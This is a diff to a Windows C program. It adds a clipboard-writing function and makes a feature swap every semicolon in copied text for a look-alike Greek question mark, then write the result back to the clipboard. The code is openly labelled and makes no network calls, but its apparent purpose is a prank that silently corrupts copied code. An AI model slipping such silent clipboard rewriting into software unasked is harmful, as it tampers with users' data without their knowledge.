@@ -1,10 +1,11 @@
 #include "clipboard.h"
 #include "../utils/logger.h"
 #include <windows.h>
+#include <stdbool.h>
 
 char *get_text_from_clipboard(void) {
     if (!OpenClipboard(NULL)) {
-        LOG_ERROR("Failed to open clipboard");
+        LOG_ERROR("Failed to open clipboard (Error: %lu)", GetLastError());
         return NULL;
     }
 
@@ -18,7 +19,7 @@ char *get_text_from_clipboard(void) {
     // Lock the handle to get pointer to the data
     const char *pszText = GlobalLock(hData);
     if (pszText == NULL) {
-        LOG_ERROR("Failed to lock clipboard data\n");
+        LOG_ERROR("Failed to lock clipboard data (Error: %lu)", GetLastError());
         CloseClipboard();
         return NULL;
     }
@@ -35,6 +36,70 @@ char *get_text_from_clipboard(void) {
     CloseClipboard();
 
     return text;
+}
+
+bool write_text_to_clipboard(const char *text) {
+    if (!text) {
+        return false;
+    }
+
+    // Convert UTF-8 to UTF-16
+    const int wlen = MultiByteToWideChar(CP_UTF8, 0, text, -1, NULL, 0);
+    if (wlen == 0) {
+        LOG_ERROR("MultiByteToWideChar size calculation failed (Error: %lu)", GetLastError());
+        return false;
+    }
+
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, wlen * sizeof(wchar_t));
+    if (!hMem) {
+        LOG_ERROR("GlobalAlloc failed (Error: %lu)", GetLastError());
+        return false;
+    }
+
+    wchar_t *pMem = GlobalLock(hMem);
+    if (!pMem) {
+        LOG_ERROR("GlobalLock failed (Error: %lu)", GetLastError());
+        GlobalFree(hMem);
+        return false;
+    }
+
+    if (MultiByteToWideChar(CP_UTF8, 0, text, -1, pMem, wlen) == 0) {
+        LOG_ERROR("MultiByteToWideChar conversion failed (Error: %lu)", GetLastError());
+        GlobalUnlock(hMem);
+        GlobalFree(hMem);
+        return false;
+    }
+    GlobalUnlock(hMem);
+
+    int retry_count = 0;
+    while (!OpenClipboard(NULL) && retry_count < 5) {
+        Sleep(10);
+        retry_count++;
+    }
+
+    if (retry_count >= 5) {
+        LOG_ERROR("Failed to open clipboard after %d retries", retry_count);
+        GlobalFree(hMem);
+        return false;
+    }
+
+    if (!EmptyClipboard()) {
+        LOG_ERROR("EmptyClipboard failed (Error: %lu)", GetLastError());
+        CloseClipboard();
+        GlobalFree(hMem);
+        return false;
+    }
+
+    if (SetClipboardData(CF_UNICODETEXT, hMem) == NULL) {
+        LOG_ERROR("SetClipboardData failed (Error: %lu)", GetLastError());
+        CloseClipboard();
+        GlobalFree(hMem);
+        return false;
+    }
+
+    // Close clipboard (don't free hMem - clipboard owns it now)
+    CloseClipboard();
+    return true;
 }
 
 /// Replace all semicolons in the input string with Greek question marks (;).
@@ -96,15 +161,17 @@ void execute_clipboard_feature(void *ignored) {
         return;
     }
     char *modified_text = replace_semicolon_with_greek_question_mark(text);
+    free(text);
     if (!modified_text) {
         LOG_DEBUG("Modified text is NULL, no modifications made or error occurred");
-        free(text);
         return;
     }
 
-    LOG_DEBUG("Clipboard text: %s", text ? text : "(null)");
-    free(text);
-    LOG_DEBUG("Modified clipboard text: %s", modified_text);
+    if (!write_text_to_clipboard(modified_text)) {
+        LOG_ERROR("Failed to write modified text to clipboard");
+    } else {
+        LOG_DEBUG("Clipboard text modified successfully");
+    }
     free(modified_text);
 }
 
